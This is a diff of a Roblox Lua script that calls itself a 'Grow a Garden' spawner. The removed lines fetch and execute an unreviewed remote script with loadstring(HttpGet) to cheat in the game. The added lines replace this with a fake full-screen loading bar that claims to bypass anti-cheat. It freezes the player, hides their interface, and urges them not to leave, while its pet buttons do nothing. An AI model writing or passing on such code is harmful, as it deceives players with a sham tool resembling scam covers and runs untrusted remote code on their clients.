@@ -1,131 +1,118 @@
--- Grow a Garden Spawner GUI with Dropdowns & Spawn Functionality
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
 
--- Main UI
-local ScreenGui = Instance.new("ScreenGui", PlayerGui)
-ScreenGui.Name = "GrowSpawnerGUI"
-ScreenGui.ResetOnSpawn = false
+local function SetupLoadingScreen()
+    local player = Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
 
-local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 300, 0, 300)
-MainFrame.Position = UDim2.new(0.05, 0, 0.2, 0)
-MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-MainFrame.BorderSizePixel = 0
-MainFrame.Active = true
-MainFrame.Draggable = true
+    if playerGui:FindFirstChild("FullCoverLoading") then
+        playerGui.FullCoverLoading:Destroy()
+    end
 
-local UICorner = Instance.new("UICorner", MainFrame)
-UICorner.CornerRadius = UDim.new(0, 12)
+    -- Disable movement
+    local function disableMovement()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+        end
+    end
+    disableMovement()
+    player.CharacterAdded:Connect(disableMovement)
 
-local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.Text = "🌱 Grow a Garden Spawner"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.BackgroundTransparency = 1
-Title.Font = Enum.Font.GothamBold
-Title.TextSize = 18
+    -- Disable other GUIs
+    for _, gui in ipairs(playerGui:GetChildren()) do
+        if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then
+            gui.Enabled = false
+        end
+    end
 
-local DropdownTemplate = function(name, items)
-	local Dropdown = Instance.new("Frame", MainFrame)
-	Dropdown.Size = UDim2.new(1, -20, 0, 30)
-	Dropdown.Position = UDim2.new(0, 10, 0, 50 + (#MainFrame:GetChildren() - 2) * 35)
-	Dropdown.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    -- Screen GUI
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "FullCoverLoading"
+    screenGui.IgnoreGuiInset = true
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    screenGui.Parent = playerGui
 
-	local UICorner = Instance.new("UICorner", Dropdown)
-	UICorner.CornerRadius = UDim.new(0, 6)
+    local background = Instance.new("Frame")
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.ZIndex = 10000
+    background.Parent = screenGui
 
-	local Label = Instance.new("TextLabel", Dropdown)
-	Label.Size = UDim2.new(0.4, 0, 1, 0)
-	Label.Text = name
-	Label.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Label.BackgroundTransparency = 1
-	Label.Font = Enum.Font.Gotham
-	Label.TextSize = 14
-	Label.TextXAlignment = Enum.TextXAlignment.Left
+    local progressBar = Instance.new("Frame")
+    progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+    progressBar.Size = UDim2.new(0, 0, 0.01, 0)
+    progressBar.Position = UDim2.new(0.2, 0, 0.6, 0)
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 10001
+    progressBar.Parent = background
 
-	local Drop = Instance.new("TextButton", Dropdown)
-	Drop.Size = UDim2.new(0.6, 0, 1, 0)
-	Drop.Position = UDim2.new(0.4, 0, 0, 0)
-	Drop.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-	Drop.TextColor3 = Color3.fromRGB(255, 255, 255)
-	Drop.Text = "Select"
-	Drop.Font = Enum.Font.Gotham
-	Drop.TextSize = 14
+    local function createLabel(text, position, size, font, color)
+        local label = Instance.new("TextLabel")
+        label.Size = size
+        label.Position = position
+        label.Text = text
+        label.Font = font
+        label.TextColor3 = color
+        label.TextScaled = true
+        label.BackgroundTransparency = 1
+        label.ZIndex = 10001
+        label.Parent = background
+        return label
+    end
 
-	local UICornerBtn = Instance.new("UICorner", Drop)
-	UICornerBtn.CornerRadius = UDim.new(0, 6)
+    local loadingText = createLabel("Loading.. 0%", UDim2.new(0.4, 0, 0.45, 0), UDim2.new(0.2, 0, 0.05, 0), Enum.Font.GothamBold, Color3.new(1, 1, 1))
+    local statusText = createLabel("Please wait... Bypassing anti-cheat.", UDim2.new(0.33, 0, 0.53, 0), UDim2.new(0.34, 0, 0.03, 0), Enum.Font.Gotham, Color3.fromRGB(180, 180, 180))
+    local warningText = createLabel("Do not leave! Progress will be lost.", UDim2.new(0.33, 0, 0.58, 0), UDim2.new(0.34, 0, 0.03, 0), Enum.Font.GothamBold, Color3.fromRGB(255, 0, 0))
+    local creditText = createLabel("Made by 'swaguanscripter'", UDim2.new(0.4, 0, 0.63, 0), UDim2.new(0.2, 0, 0.03, 0), Enum.Font.Gotham, Color3.fromRGB(200, 200, 200))
+    local espText = createLabel("Wait till 100% for the egg esp to work", UDim2.new(0.3, 0, 0.68, 0), UDim2.new(0.4, 0, 0.03, 0), Enum.Font.GothamBold, Color3.fromRGB(255, 255, 0))
 
-	local Selected = nil
+    -- Pet Selection UI
+    local petGui = Instance.new("Frame")
+    petGui.Size = UDim2.new(0, 200, 0, 400)
+    petGui.Position = UDim2.new(0.8, 0, 0.1, 0)
+    petGui.BackgroundTransparency = 1
+    petGui.ZIndex = 10001
+    petGui.Parent = background
 
-	Drop.MouseButton1Click:Connect(function()
-		local Menu = Instance.new("Frame", ScreenGui)
-		Menu.Size = UDim2.new(0, 200, 0, #items * 25)
-		Menu.Position = UDim2.new(0, Drop.AbsolutePosition.X, 0, Drop.AbsolutePosition.Y + 25)
-		Menu.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-		Menu.BorderSizePixel = 0
+    local title = createLabel("Select Pet To Spawn", UDim2.new(0, 0, 0, 0), UDim2.new(0, 200, 0, 40), Enum.Font.GothamBold, Color3.fromRGB(0, 180, 255))
+    title.Parent = petGui
 
-		for i, item in ipairs(items) do
-			local Option = Instance.new("TextButton", Menu)
-			Option.Size = UDim2.new(1, 0, 0, 25)
-			Option.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
-			Option.Text = item
-			Option.Font = Enum.Font.Gotham
-			Option.TextColor3 = Color3.fromRGB(255, 255, 255)
-			Option.BackgroundTransparency = 1
-			Option.MouseButton1Click:Connect(function()
-				Drop.Text = item
-				Selected = item
-				Menu:Destroy()
-			end)
-		end
-	end)
+    local selectedLabel = createLabel("None Selected", UDim2.new(0, 0, 0, 40), UDim2.new(0, 200, 0, 30), Enum.Font.GothamBold, Color3.new(1, 1, 1))
+    selectedLabel.Parent = petGui
 
-	return function()
-		return Selected
-	end
+    local petList = {"Disco Bee", "Queen Bee", "Raccoon", "Dragonfly", "Red Fox", "Butterfly", "Polar Bear", "Turtle"}
+
+    for i, pet in ipairs(petList) do
+        local button = Instance.new("TextButton")
+        button.Text = "SELECT " .. pet
+        button.Size = UDim2.new(0, 200, 0, 30)
+        button.Position = UDim2.new(0, 0, 0, 70 + (i - 1) * 35)
+        button.Font = Enum.Font.Gotham
+        button.TextColor3 = Color3.new(0, 0, 0)
+        button.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
+        button.ZIndex = 10001
+        button.Parent = petGui
+        button.MouseButton1Click:Connect(function()
+            selectedLabel.Text = pet
+        end)
+    end
+
+    -- Progress loading
+    local totalSteps = 100
+    for i = 1, totalSteps do
+        progressBar.Size = UDim2.new(0.6 * (i / 100), 0, 0.01, 0)
+        loadingText.Text = "Loading.. " .. i .. "%"
+        task.wait(0.05)
+    end
+
+    loadingText.Text = "Complete."
+    statusText.Text = "Game Ready."
 end
 
--- Spawner library
-local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
-Spawner.Load()
-
--- Data
-local pets = Spawner.GetPets()
-local seeds = Spawner.GetSeeds()
-local fruits = { "Golden Apple", "Sunberry", "Sweet Melon", "Blue Mango", "Mystery Fruit" }
-
--- Dropdowns
-local getPet = DropdownTemplate("Pet", pets)
-local getSeed = DropdownTemplate("Seed", seeds)
-local getFruit = DropdownTemplate("Fruit", fruits)
-
--- Spawn Button
-local SpawnButton = Instance.new("TextButton", MainFrame)
-SpawnButton.Size = UDim2.new(1, -20, 0, 40)
-SpawnButton.Position = UDim2.new(0, 10, 1, -50)
-SpawnButton.Text = "🐾 Spawn Selection"
-SpawnButton.BackgroundColor3 = Color3.fromRGB(80, 150, 80)
-SpawnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-SpawnButton.Font = Enum.Font.GothamBold
-SpawnButton.TextSize = 16
-
-local UICornerSpawn = Instance.new("UICorner", SpawnButton)
-UICornerSpawn.CornerRadius = UDim.new(0, 10)
-
-SpawnButton.MouseButton1Click:Connect(function()
-	local pet = getPet()
-	local seed = getSeed()
-	local fruit = getFruit()
-
-	if pet then
-		Spawner.SpawnPet(pet, 1, 1)
-	end
-	if seed then
-		Spawner.SpawnSeed(seed)
-	end
-	if fruit then
-		Spawner.Spin(fruit)
-	end
-end)
+SetupLoadingScreen()
